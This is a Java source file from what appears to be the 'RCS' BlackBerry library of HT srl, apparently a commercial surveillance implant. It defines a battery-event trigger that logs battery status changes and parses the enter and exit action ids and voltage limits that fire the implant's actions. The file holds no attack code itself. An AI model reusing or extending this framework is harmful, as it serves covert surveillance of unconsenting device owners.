/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : BatteryEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;

import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.util.DataBuffer;
import blackberry.AppListener;
import blackberry.action.Action;
import blackberry.interfaces.BatteryStatusObserver;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class BatteryEvent.
 */
public final class BatteryEvent extends Event implements BatteryStatusObserver {

    // #debug
    private static Debug debug = new Debug("AcEvent", DebugLevel.VERBOSE);
    int actionOnEnter;
    int actionOnExit;

    int minVolt;
    int maxVolt;

    /**
     * Instantiates a new battery event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public BatteryEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_BATTERY, actionId, confParams);

        setPeriod(NEVER);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    protected void actualStart() {
        AppListener.getInstance().addBatteryStatusObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    protected void actualStop() {
        AppListener.getInstance().removeBatteryStatusObserver(this);
    }

    /**
     * Battery status change.
     * 
     * @param arg0
     *            the arg0
     */
    public void batteryStatusChange(final int arg0) {
        switch (arg0) {
        case DeviceInfo.BSTAT_AC_CONTACTS:
            // #debug info
            debug.info("BSTAT_AC_CONTACTS");
            break;
        case DeviceInfo.BSTAT_CHARGING:
            // #debug info
            debug.info("BSTAT_CHARGING");
            break;
        case DeviceInfo.BSTAT_DEAD:
            // #debug info
            debug.info("BSTAT_DEAD");
            break;
        case DeviceInfo.BSTAT_IS_USING_EXTERNAL_POWER:
            // #debug info
            debug.info("BSTAT_IS_USING_EXTERNAL_POWER");
            break;
        case DeviceInfo.BSTAT_LEVEL_CHANGED:
            // #debug info
            debug.info("BSTAT_LEVEL_CHANGED");
            break;
        case DeviceInfo.BSTAT_LOW:
            // #debug info
            debug.info("BSTAT_LOW");
            break;
        case DeviceInfo.BSTAT_LOW_RATE_CHARGING:
            // #debug info
            debug.info("BSTAT_LOW_RATE_CHARGING");
            break;
        case DeviceInfo.BSTAT_NO_CAMERA_FLASH:
            // #debug info
            debug.info("BSTAT_NO_CAMERA_FLASH");
            break;
        case DeviceInfo.BSTAT_NO_RADIO:
            // #debug info
            debug.info("BSTAT_NO_RADIO");
            break;
        case DeviceInfo.BSTAT_NO_TURN_ON:
            // #debug info
            debug.info("BSTAT_NO_TURN_ON");
            break;
        case DeviceInfo.BSTAT_NO_WLAN:
            // #debug info
            debug.info("BSTAT_NO_WLAN");
            break;
        case DeviceInfo.BSTAT_NONE:
            // #debug info
            debug.info("BSTAT_NONE");
            break;
        case DeviceInfo.BSTAT_REVERSED:
            // #debug info
            debug.info("BSTAT_REVERSED");
            break;
        case DeviceInfo.BSTAT_TOO_COLD:
            // #debug info
            debug.info("BSTAT_TOO_COLD");
            break;
        case DeviceInfo.BSTAT_TOO_HOT:
            // #debug info
            debug.info("BSTAT_TOO_HOT");
            break;
        case DeviceInfo.BSTAT_UNKNOWN_BATTERY:
            // #debug info
            debug.info("BSTAT_UNKNOWN_BATTERY");
            break;
        default:
            // #debug info
            debug.info("UNKNOWN");
            break;
        }

    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.BatteryStatusObserver#onBatteryStatusChange(int,
     * int)
     */
    public void onBatteryStatusChange(final int status, final int diff) {
        for (int i = 0; i < 32; i++) {
            final boolean bit = Utils.getBit(diff, i);
            if (bit) {
                batteryStatusChange(1 << i);
            }
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            actionOnExit = databuffer.readInt();
            actionOnEnter = actionId;

            minVolt = databuffer.readInt();
            maxVolt = databuffer.readInt();

            // #ifdef DBC
            Check.asserts(actionOnEnter >= Action.ACTION_NULL,
                    "negative value Enter");
            Check.asserts(actionOnExit >= Action.ACTION_NULL,
                    "negative value Exit");
            // #endif

        } catch (final EOFException e) {
            actionOnEnter = Action.ACTION_NULL;
            actionOnExit = Action.ACTION_NULL;
            return false;
        }
        return true;
    }

}
